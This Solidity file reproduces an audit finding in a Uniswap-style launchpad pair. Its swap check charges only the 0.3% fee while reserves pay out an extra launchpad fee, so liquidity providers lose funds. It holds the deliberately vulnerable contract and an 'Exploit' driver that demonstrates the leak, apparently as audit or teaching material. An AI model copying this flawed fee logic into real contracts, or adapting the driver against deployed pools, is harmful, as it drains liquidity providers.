// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic reproduction of GTE finding 64858 (H-10):
// "Protocol fails to charge fees from swap amount".
//
// Source: code-423n4/2025-08-gte-perps
//   contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol  (swap / _update / _getLaunchpadFees)
// `swap()`, `_update()` and `_getLaunchpadFees()` are reproduced VERBATIM
// (the @> marker is on the K-check line that only deducts the 0.3% swap fee).
//
// Root cause: the K-invariant check in swap() only requires the standard 0.3%
// fee (`balance.mul(1000).sub(amountIn.mul(3))`). But _update() ALSO distributes
// an extra `launchpadFee` and subtracts it from the reserves
// (`reserve = balance - totalLaunchpadFee`). Since that launchpad fee is never
// added to the required swap input, the swapper pays only 0.3% while the pool
// pays the launchpad fee out of its OWN liquidity — LPs lose the launchpad fee on
// every swap.
// ─────────────────────────────────────────────────────────────────────────────

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) { return a * b; }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) { return a - b; }
}

interface IERC20 {
    function balanceOf(address a) external view returns (uint256);
    function transfer(address to, uint256 a) external returns (bool);
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract MiniToken is IERC20 {
    string public name; string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE pair — swap()/_update()/_getLaunchpadFees() reproduced VERBATIM.
// ─────────────────────────────────────────────────────────────────────────────
contract GTELaunchpadV2Pair {
    using SafeMath for uint256;

    uint256 public constant MINIMUM_LIQUIDITY = 1000;
    uint112 public constant REWARDS_FEE_SHARE = 30; // launchpad reward fee share

    address public token0;
    address public token1;
    uint112 private reserve0;
    uint112 private reserve1;
    uint32 private blockTimestampLast;

    // LP accounting
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    address public launchpadLp;

    address public launchpadFeeDistributor;
    uint256 public rewardsPoolActive = 1;
    uint112 public accruedLaunchpadFee0;
    uint112 public accruedLaunchpadFee1;

    bool private unlocked = true;
    modifier lock() { require(unlocked, "LOCKED"); unlocked = false; _; unlocked = true; }

    function initialize(address _t0, address _t1, address _launchpadLp, address _distributor) external {
        token0 = _t0; token1 = _t1; launchpadLp = _launchpadLp; launchpadFeeDistributor = _distributor;
    }

    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _ts) {
        return (reserve0, reserve1, blockTimestampLast);
    }

    /// @notice Seed initial reserves + LP (faithful mint used by tests, not the vuln).
    function seed(uint256 r0, uint256 r1, uint256 lpToLaunchpad) external {
        reserve0 = uint112(r0); reserve1 = uint112(r1);
        totalSupply = lpToLaunchpad + MINIMUM_LIQUIDITY;
        balanceOf[launchpadLp] = lpToLaunchpad;
        blockTimestampLast = 0;
    }

    function _safeTransfer(address token, address to, uint256 value) private {
        require(IERC20(token).transfer(to, value), "TRANSFER_FAILED");
    }

    function _getLaunchpadFees(uint256 amount0In, uint256 amount1In) internal view returns (uint112 fee0, uint112 fee1) {
        uint256 totalLpBal = totalSupply;
        uint256 launchpadLpBal = balanceOf[launchpadLp] + MINIMUM_LIQUIDITY;

        if (amount0In > 0) fee0 = uint112(amount0In.mul(REWARDS_FEE_SHARE).mul(launchpadLpBal) / (totalLpBal * 1000));
        if (amount1In > 0) fee1 = uint112(amount1In.mul(REWARDS_FEE_SHARE).mul(launchpadLpBal) / (totalLpBal * 1000));
        return (fee0, fee1);
    }

    function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) private {
        if (fee0 > 0) _safeTransfer(token0, launchpadFeeDistributor, fee0);
        if (fee1 > 0) _safeTransfer(token1, launchpadFeeDistributor, fee1);
    }

    function _update(
        uint256 balance0,
        uint256 balance1,
        uint112 _reserve0,
        uint112 _reserve1,
        uint112 newLaunchpadFee0,
        uint112 newLaunchpadFee1
    ) private {
        if (balance0 > type(uint112).max || balance1 > type(uint112).max) revert("UniswapV2: OVERFLOW");

        uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
        uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;

        uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);
        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired
        if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
            if (launchpadFeeDistributor > address(0)) {
                if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
                    delete accruedLaunchpadFee0;
                    delete accruedLaunchpadFee1;
                    _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
                }
            }
        } else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {
            accruedLaunchpadFee0 = totalLaunchpadFee0;
            accruedLaunchpadFee1 = totalLaunchpadFee1;
        }

        // reserves reduced by the (unbacked) launchpad fee — the LP leak
        reserve0 = _reserve0 = uint112(balance0) - totalLaunchpadFee0;
        reserve1 = _reserve1 = uint112(balance1) - totalLaunchpadFee1;

        blockTimestampLast = blockTimestamp;
    }

    // ── VERBATIM swap() from the audited source ──
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external lock {
        if (amount0Out == 0 && amount1Out == 0) revert("UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT");
        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
        if (amount0Out >= _reserve0 || amount1Out >= _reserve1) revert("UniswapV2: INSUFFICIENT_LIQUIDITY");

        uint256 balance0;
        uint256 balance1;
        {
            address _token0 = token0;
            address _token1 = token1;
            if (to == _token0 || to == _token1) revert("UniswapV2: INVALID_TO");
            if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
            if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
            if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);
            balance0 = IERC20(_token0).balanceOf(address(this));
            balance1 = IERC20(_token1).balanceOf(address(this));
        }
        uint256 amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
        uint256 amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
        if (amount0In == 0 && amount1In == 0) revert("UniswapV2: INSUFFICIENT_INPUT_AMOUNT");

        {
            uint256 balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3)); // @> VULN: K-check only deducts the 0.3% swap fee; the launchpad fee distributed below is never added to the required input, so the swapper never pays it
            uint256 balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));

            if (balance0Adjusted.mul(balance1Adjusted) < uint256(_reserve0).mul(_reserve1).mul(1000 ** 2)) {
                revert("UniswapV2: K");
            }

            (uint112 launchpadFee0, uint112 launchpadFee1) = launchpadFeeDistributor > address(0)
                && rewardsPoolActive > 0 ? _getLaunchpadFees(amount0In, amount1In) : (uint112(0), uint112(0));

            _update(balance0, balance1, _reserve0, _reserve1, launchpadFee0, launchpadFee1);
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: do one honest swap paying only the 0.3% fee, and show the pool
// leaks the launchpad fee to the distributor (SINK) out of LP liquidity.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 internal constant R = 1_000_000e18;
    uint256 internal constant AMOUNT_IN = 10_000e18;

    MiniToken public token0;             // child nonce 1 (leaked asset)
    MiniToken public token1;             // child nonce 2
    GTELaunchpadV2Pair public vuln;      // child nonce 3 (VULN)

    uint256 public leakedToDistributor;

    constructor() {
        token0 = new MiniToken("Token0", "TK0"); // nonce 1
        token1 = new MiniToken("Token1", "TK1"); // nonce 2
        vuln = new GTELaunchpadV2Pair();         // nonce 3
    }

    function run() external {
        // distributor is the SINK so the leaked fee lands measurably
        vuln.initialize(address(token0), address(token1), address(this), SINK);
        // pool reserves + LP (launchpad owns all LP -> full launchpad share)
        token0.mint(address(vuln), R);
        token1.mint(address(vuln), R);
        vuln.seed(R, R, 1_000e18);

        // an honest swapper sends 10_000 token0 in and takes a conservative token1 out (passes the 0.3% K-check)
        token0.mint(address(this), AMOUNT_IN);
        token0.transfer(address(vuln), AMOUNT_IN);
        uint256 out1 = 9_000e18; // well under the K-limit for a 10_000 input on 1e24 reserves
        vuln.swap(0, out1, address(this), "");

        // harm: the launchpad fee was paid out of LP reserves to the distributor,
        // even though the swapper only paid the 0.3% swap fee
        leakedToDistributor = token0.balanceOf(SINK);
        require(leakedToDistributor > 0, "no unbacked launchpad fee leaked");
    }
}
